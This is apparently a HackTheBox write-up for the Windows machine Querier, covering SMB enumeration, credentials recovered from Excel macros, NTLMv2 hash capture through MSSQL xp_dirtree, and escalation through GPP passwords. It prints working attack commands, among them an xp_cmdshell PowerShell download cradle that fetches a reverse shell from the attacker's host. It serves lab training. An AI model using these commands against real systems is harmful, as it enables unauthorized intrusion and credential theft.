---
title: Querier
date: 2026-03-05
categories: [CTFs, HackTheBox]
tags: [medium, windows, crackmapexec, smbmap, olevba, mssql, xp_dirtree, xp_cmdshell, powerup, gpp-decrypt]
media_subpath: /assets/img/HackTheBox/Querier
image: 
    path: Querier.webp
    lqip: data:image/webp;base64,UklGRlIAAABXRUJQVlA4IEYAAABwAwCdASoUAAsAPzmGuVOvKSWisAgB4CcJYwAAQvISYSSCVzAA/ujxDyl36hKbKZAH1IFH6u/+cZObWrXZhJDfE59vyNAA
    alt: Info Card
---

## Summary

[Querier](https://www.hackthebox.com/machines/querier){: target="_blank" } is a medium-difficulty Windows machine centered on identifying and exploiting insecure file shares and database misconfigurations. The entry point involves retrieving a macro-enabled Excel spreadsheet from a world-readable SMB share. Analysis of the VBA macros reveals a hardcoded connection string that is leveraged to force a NetNTLMv2 hash leak via the MSSQL service. Once the hash is captured and cracked to recover plaintext credentials, the path to administrator involves auditing locally cached Group Policy files for exposed administrative passwords.

## Port Scanning

All **TCP** ports scanning with `nmap`

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.126.47 -oN allports
```

![Description: ](image_1.webp)
_Open Ports_

>Extract open ports from `nmap` output with the following command:
>
>`cat allports | grep -oP '\d{1,5}/tcp' | cut -d/ -f1 | xargs | tr ' ' ','`
{: .prompt-tip }

## Service Detection

Running `nmap`'s default scripts to extract more info and versions.

```bash
nmap -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sCV 10.129.126.47 -oN services
```

![Description: ](image_2.webp)
_SMB & MSSQL_

## Port 445 - SMB Enumeration

There are a lot of ports open, so let's begin with **SMB**. Using `crackmapexec` and `smbmap` we can know the **OS Version** and available shares.

```bash
crackmapexec smb 10.129.126.47
```

![Description: ](image_3.webp)
_Initial interaction with SMB_

```bash
smbmap -H 10.129.126.47 -u 'null' -p 'null' --no-banner
```

![Description: ](image_4.webp)
_SMB null session_

`smbmap` has a parameter **-r** to explore the readable shares and there is an **Excel File** with macros.

```bash
smbmap -H 10.129.126.47 -u 'null' -p 'null' -r 'Reports' --no-banner
```

![Description: ](image_5.webp)
_Finding an Excel file_

We are going to download that **excel** file using `smbmap` as well and we will renamed it as **report.xlsm**.

```bash
smbmap -H 10.129.126.47 -u 'null' -p 'null' --download 'Reports/Currency Volume Report.xlsm' --no-banner
```

![Description: ](image_6.webp)
_Saving Excel file to our box_

>An .xlsm file is an Excel Workbook format that enables the use of embedded macros (VBA).
{: .prompt-info }

## Analyzing Macros with Olevba

You can install [Oletools](https://pypi.org/project/oletools/){: target="_blank" } in order to have the `olevba`. Then you just have to run the following command:

```bash
olevba report.xlsm
```

![Description: ](image_7.webp)
_Analyzing Macros with Olevba_

It dumps all the content of the macro from **reporting.xlsm** and there is a credential that we can check if it's valid using `crackmapexec`. Since [Port 1433](https://www.cbtnuggets.com/common-ports/what-is-port-1433){: target="_blank" } is open, we can also check if the credential is valid for [Microsoft SQL Server](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver16){: target="_blank" } service.

```bash
crackmapexec mssql 10.129.126.47 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
```

![Description: ](image_8.webp)
_Testing creds on MSSQL_

>**SQL Credentials**
>
>`reporting:PcwTWTHRwryjc$c6`
{: .prompt-tip }

## Shell as mssql-svc

Since the credentials have been verified as valid, we can authenticate to the MSSQL instance using `impacket-mssqlclient`

>To authenticate using Windows credentials (instead of SQL Server authentication), ensure the **--windows-auth** flag is included in your command.
{: .prompt-warning }

```bash
impacket-mssqlclient WORKGROUP/reporting:'PcwTWTHRwryjc$c6'@10.129.126.47 -windows-auth
```

![Description: ](image_9.webp)
_Access MSSQL as reporting_

There is a way to execute commands on SQL Server, however we don't have access to run [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16){: target="_blank" } or to enable it via [sp_configure](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver16){: target="_blank" }.

![Description: ](image_10.webp)
_Access denied to xp_cmdshell_

### NTLMv2 Hash Capture via xp_dirtree

Since don't have permission to run or enable `xp_cmdshell`, we can attempt to get the hash of the user running the SQL service. To do that we can use [xp_dirtree](https://www.sqlops.com/what-is-xp_dirtree/){: target="_blank" } which allows to list all the resources of a certain directory or path.

```sql
xp_dirtree
```

![Description: ](image_11.webp)
_Listing directories with xp_dirtree_

Now we can abuse this functionality to list all the files in a **SMB** remote server via a [UNC Path](https://www.minitool.com/lib/unc-path.html){: target="_blank" }, which means we could leverage `xp_dirtree` to collect NTLMv2 hashes.

First star your **SMB Server** using `impacket-smbserver`:

```bash
impacket-smbserver share $(pwd) -smb2support
```

Then use `xp_dirtree` to list the content of you shared directory.

```batch
xp_dirtree \\10.10.15.41\share
```

![Description: ](image_12.webp)
_NTLMv2 hash capture_

As shown above, you managed to get the **NTLMv2** hash for **mssql-svc** user, so now you can crack it using `john`:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Description: ](image_13.webp)
_Cracking NTLMv2 Hash_

We found the password for **mssql-svc**, we can check it with `crackmapexec` as well. You can notice the credential is valid but also we have **Pwn3d!** next to it. This means we have more permissions on this service.

```bash
crackmapexec mssql 10.129.126.47 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
```

![Description: ](image_14.webp)
_Testing new creds on MSSQL_

>**SQL Credentials**
>
>mssql-svc:corporate568
{: .prompt-tip }

### Enabling xp_cmdshell

After login in as **mssql-svc**, we can try to run `xp_cmdshell` but we got an error. Notice that it is a different error, it says **this component is turned off** and you can enable it by using `sp_configure`.

```bash
impacket-mssqlclient WORKGROUP/mssql-svc:'corporate568'@10.129.126.47 -windows-auth
```

![Description: ](image_15.webp)
_Access as mssql-svc_

To enable `xp_cmdshell` you must execute the following commands in that order. After doing that, you will able to run commands via `xp_cmdshell`:

```sql
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

![Description: ](image_16.webp)
_Enabling xp_cmdshell_

Finally to get a shell on the box we can use [ConPtyShell](https://github.com/antonioCoco/ConPtyShell){: target="_blank" } to get a full interactive `powershell`. To interpret the script we have to run the following command via `xp_cmdshell`.

>**REMEBER** to host the script adding the line to give you the reverse shell at the end in an http server, also to start your listener.
{: .prompt-danger }

```bash
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.15.41/revshell.ps1\")"
```

![Description: ](image_17.webp)
_Powershell access as mssql-svc_

## Privilege Escalation | GPP Passwords

We are going to use [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc){: target="_blank" } to enumerate possible ways to escalate to **Administrator**. 

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.15.41/PowerUp.ps1')
```

![Description: ](image_18.webp)
_Running PowerUp_

There is a **Groups.xml** file on the target that has a credential for the admin user. `PowerUp` already gave us the decrypted password but you can also do it with `gpp-decrypt`.

```powershell
type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
```

![Description: ](image_19.webp)
_Groups.xml file_

Using `gpp-decrypt` to get the password.

```bash
gpp-decrypt "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"
```

![Description: ](image_20.webp)
_Administrator Password_

Validating the credential with `crackmapexec`:

```bash
crackmapexec smb 10.129.126.47 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
```

![Description: ](image_21.webp)
_Testing Admin Creds_

Shell as **NT Authority\\System**

```bash
impacket-psexec Administrator@10.129.126.47
```

![Description: ](image_22.webp)
_Shell as system_

## Flags

- [x] user.txt

```batch
> type C:\Users\mssql-svc\Desktop\user.txt
b35**************************7c2
```

- [x] root.txt

```batch
> type C:\Users\Administrator\Desktop\root.txt
ded**************************407
```

<h2 style="text-align:center;">Thanks for checking out the writeup! 🙌</h2>
{: data-toc-skip='' .mt-4 .mb-0 }
